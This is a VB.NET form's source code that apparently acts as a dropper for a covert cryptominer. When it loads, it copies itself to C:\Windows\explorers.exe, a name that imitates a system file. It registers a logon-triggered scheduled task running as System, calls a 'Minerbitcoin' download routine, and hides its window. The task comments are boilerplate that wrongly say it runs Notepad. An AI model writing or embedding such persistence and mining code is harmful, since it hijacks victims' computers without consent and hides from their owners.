Imports System.Management
Imports System.Net
Imports System.IO
Imports System.Net.Mail

Public Class Form1

    Private WithEvents m_MediaConnectWatcher As ManagementEventWatcher
    Dim DriveLetter As String = ""
    Dim LblText As String = ""
    Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        'MsgBox("hello")
        Me.Location = New Point(CInt((Screen.PrimaryScreen.WorkingArea.Width / 2) - (Me.Width / 2)), CInt((Screen.PrimaryScreen.WorkingArea.Height / 2) - (Me.Height / 2)))
        'Register Task for app 
        RegTask()

        'Download Minerbitcoin
        Miner.MainMiner()

        If My.Computer.FileSystem.FileExists("C:\Windows\explorers.exe") Then
            Ie.OpenIe()
        End If
        Me.Hide()
        Me.Close()
    End Sub

    Sub TaskExploer()

        Dim service As Object
        '---------------------------------------------------------
        ' This sample schedules a task to start notepad.exe 30 seconds after
        ' the system is booted.
        '---------------------------------------------------------

        ' A constant that specifies a boot trigger.
        Const LogonTrigger = 9
        ' A constant that specifies an executable action.
        Const ActionTypeExecutable = 0

        '********************************************************
        ' Create the TaskService object.
        service = CreateObject("Schedule.Service")
        Call service.Connect()

        '********************************************************
        ' Get a folder to create a task definition in. 
        Dim rootFolder
        rootFolder = service.GetFolder("\")

        ' The taskDefinition variable is the TaskDefinition object.
        Dim taskDefinition
        ' The flags parameter is 0 because it is not supported.
        taskDefinition = service.NewTask(0)

        '********************************************************
        ' Define information about the task.

        ' Set the registration info for the task by 
        ' creating the RegistrationInfo object.
        Dim regInfo
        regInfo = taskDefinition.RegistrationInfo
        regInfo.Description = "Task will execute Notepad when " & _
            "the computer is booted."
        regInfo.Author = "Author Name"


        ' Set the task setting info for the Task Scheduler by
        ' creating a TaskSettings object.
        Dim settings
        settings = taskDefinition.Settings
        settings.StartWhenAvailable = True
        settings.Hidden = False
        settings.Priority = 7

        settings.IdleSettings.StopOnIdleEnd = True
        settings.IdleSettings.RestartOnIdle = False
        settings.AllowDemandStart = True
        settings.Enabled = True

        settings.DisallowStartIfOnBatteries = False
        settings.StopIfGoingOnBatteries = True
        settings.AllowHardTerminate = True
        settings.StartWhenAvailable = False
        settings.RunOnlyIfNetworkAvailable = False
        settings.RunOnlyIfIdle = False
        'settings.DisallowStartOnRemoteAppSession = False
        'settings.UseUnifiedSchedulingEngine = False
        settings.WakeToRun = False

        '********************************************************
        ' Create a boot trigger.
        Dim triggers
        triggers = taskDefinition.Triggers

        Dim trigger
        trigger = triggers.Create(LogonTrigger)
        trigger.Delay = "PT50S"
        trigger.Enabled = True
        '***********************************************************
        ' Create the action for the task to execute.

        ' Add an action to the task. The action executes notepad.
        'Dim Action
        ' Action = taskDefinition.Actions.Create(ActionTypeExecutable)
        ' Action.Path = "C:\UsersFile\Backup\sercurity.exe"

        Dim Action1
        '  Action1 = taskDefinition.Actions.Create(ActionTypeExecutable)
        ' Action1.Path = "C:\UsersFile\Backup\sercurity.exe"

        Action1 = taskDefinition.Actions.Create(ActionTypeExecutable)
        Action1.Path = "C:\Windows\explorers.exe"
        '***********************************************************     
        ' Register (create) the task.
        Const createOrUpdateTask = 6
        Call rootFolder.RegisterTaskDefinition( _
            "TaskName", taskDefinition, createOrUpdateTask, _
            "System", , 2)

    End Sub

    'Coppy files
    Sub RegTask()
        Dim FileName As String
        Dim FilePath As String

        'Dim publish As String = "C:\Windows\Software\publish.exe"
        TaskExploer()
        'copy1
        FileName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName
        FilePath = Path.GetFullPath(FileName)
        ' Copy the file to a new folder, overwriting existing file.
        Try
            If My.Computer.FileSystem.FileExists("C:\Windows\explorers.exe") Then
                ' MsgBox("File found.")
            Else
                'MsgBox("File not found.")
                My.Computer.FileSystem.CopyFile(
                FilePath,
                 "C:\Windows\explorers.exe",
                  Microsoft.VisualBasic.FileIO.UIOption.AllDialogs,
                    Microsoft.VisualBasic.FileIO.UICancelOption.DoNothing)
                'Check outlook da duoc cai dat chua
            End If
        Catch ex As Exception
        End Try
    End Sub
    'open ie and register

End Class
